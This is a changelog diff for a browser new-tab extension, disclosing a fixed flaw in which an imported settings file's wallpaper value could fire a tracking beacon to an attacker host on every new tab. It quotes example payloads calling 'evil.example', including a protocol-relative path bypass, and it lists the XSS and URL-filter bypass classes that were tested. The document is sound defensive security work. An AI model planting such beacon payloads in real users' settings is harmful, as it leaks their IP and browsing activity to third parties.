@@ -6,6 +6,127 @@ The format follows [Keep a Changelog](https://keepachangelog.com/).
 
 ---
 
+## [1.10.8] — 2026-08-10
+
+A security pass over every surface that accepts attacker-controlled
+data. One real vulnerability, one false privacy disclosure, and a long
+list of things that held.
+
+### Fixed — an imported settings file could plant a tracking beacon
+
+`yancotab_wallpaper` is registered with `validate: (v) => typeof v ===
+'string'`, so **every** string passes. `resolveWallpaper` fell through
+its branches to `{ kind: 'css', value: <the string> }`, which is
+assigned to `shell.style.background`. A settings JSON containing
+
+```json
+{"yancotab_wallpaper":"#000 url(https://evil.example/beacon.png?u=victim)"}
+```
+
+therefore issued a request to an attacker's host **on every new tab**,
+leaking IP, User-Agent and browsing cadence — invisibly, because an
+unreachable URL simply paints nothing. The key's `syncPolicy` is
+`'always'`, so `chrome.storage.sync` replicated it to the user's other
+devices, and it survived restarts. The manifest declares no `img-src`,
+so nothing blocked it.
+
+The old comment on that branch reasoned that "the browser drops an
+invalid declaration rather than reinterpreting the rest of the rule" —
+which is true, and covers declaration *injection* only. It said nothing
+about a perfectly **valid** declaration that fetches. That was the gap.
+Arbitrary strings are no longer painted as CSS: anything that can issue
+a request (`url()`, `image-set()`, `image()`, `cross-fade()`, `var()`,
+`//`) falls back to the default wallpaper.
+
+**A second route through the same attack** was found by the test written
+for the first: `SAFE_PATH_RE` was `[A-Za-z0-9._\-/]+`, and
+`//evil.example/b.png` is composed entirely of letters, dots and
+slashes — so a protocol-relative URL passed as an innocent local asset
+path and became `url("//evil.example/b.png")` via the *image* branch,
+bypassing the CSS guard entirely. The pattern now rejects a doubled
+slash; no real asset path contains one.
+
+Not XSS: CSSOM refuses `red; color: blue` outright, verified. This was
+exfiltration only.
+
+### Fixed — the in-app privacy panel named the wrong favicon host
+
+Settings' privacy panel listed `s2.googleusercontent.com` (Google's
+cookieless static host) while all four call sites actually requested
+`www.google.com/s2/favicons` — the **cookied** domain, so a
+`SameSite=None` Google cookie rode along with every bookmark icon,
+associating the user's Google identity with every domain they bookmark,
+on every home-screen render. `privacy.html` said `www.google.com`, so
+the product's two disclosures also contradicted each other.
+
+Resolved in the direction that helps the user: the four call sites now
+use the cookieless host — verified live that it returns an identical
+32×32 icon before switching, so favicons could not break silently — and
+`privacy.html` was corrected to match. The Browser's portal tiles also
+gained the `referrerpolicy="no-referrer"` that PagePanes already had.
+
+### Checked and found safe
+
+Recorded because the negative results are the point of a security pass.
+Each was executed against the running app, not reasoned about:
+
+- **Markdown renderer** (the only dynamic `innerHTML` in the codebase) —
+  14 payloads mounted the way the Notes preview mounts them: none
+  executed. `javascript:`/`data:`/`vbscript:`/`file:`/`blob:`/
+  protocol-relative produce no anchor at all; raw HTML is escaped;
+  images are never emitted as `<img>`.
+- **`isSafeUrl`** — 19 bypasses (case, leading whitespace, tab/newline/
+  NUL, zero-width unicode, `java\tscript:`, protocol-relative) all
+  rejected; it parses with the WHATWG URL parser rather than matching
+  strings.
+- **Prototype pollution** — five payload shapes inside *valid* export
+  envelopes (top-level, nested in a value, `constructor.prototype`,
+  array element, deep): no pollution. `importAll`'s stripping is
+  recursive and array-aware.
+- **SVG shortcut icons** — handlers stripped, `<script>` removed,
+  `<foreignObject>` and `<use xlink:href="data:">` rejected outright.
+- **Manifest** — MV3, `storage` only, no host permissions, `frame-src`
+  pinned to one host, and no `eval`/`new Function` anywhere.
+- **`setLiteralHtml`** — all 29 call sites are static constants; none
+  interpolates a variable.
+- **Uploads** — 10 MB image/file caps, 5 MB wallpaper, PDF verified by
+  magic bytes rather than MIME.
+- **Network** — zero third-party requests across boot and opening all
+  22 apps in the default configuration.
+
+### Known — not fixed here
+
+- `setLiteralHtml`'s docblock claims "any scripts in the markup never
+  execute". `<script>` indeed does not, but `<img onerror>` and
+  `<svg><animate onbegin>` **do**. No attacker-controlled string reaches
+  that sink today (the user-supplied icon path correctly uses
+  `parseSafeSvg`), so this is a comment that invites future misuse
+  rather than a vulnerability.
+- `codexAnnotations.js` builds a `Function()` for calc-on-selection.
+  The extension CSP has no `unsafe-eval`, so it throws and is swallowed
+  into a "Calc failed" toast — the feature has never worked in the
+  shipped extension. Same class as the v1.9.2 OCR path.
+- `readCustomImage()` does not unwrap the AppStorage envelope while
+  `readMarker()` does, so a custom wallpaper restored via import never
+  applies.
+- Adding an `img-src` CSP directive would kill this whole bug class as
+  defence in depth, but it needs its own enumeration of every legitimate
+  image source (`data:` photos, `blob:` PDF pages, favicons) and its own
+  verification — rushing it into this release could break images
+  silently.
+
+### Tests
+
+2172 (+13). The beacon suite covers eleven fetching markers across both
+branches, and asserts in the same breath that legacy gradients, hex
+colours, shipped themes, presets and `url("assets/…")` paths still
+resolve — a guard that quietly reset everyone's wallpaper would be its
+own bug. Verified live end-to-end: before the fix the beacon request
+appeared in the network log; after it, all three attack shapes fall back
+to the default wallpaper and no request is made.
+
+---
+
 ## [1.10.7] — 2026-08-10
 
 Found by auditing the codebase for its recurring bug — code that looks
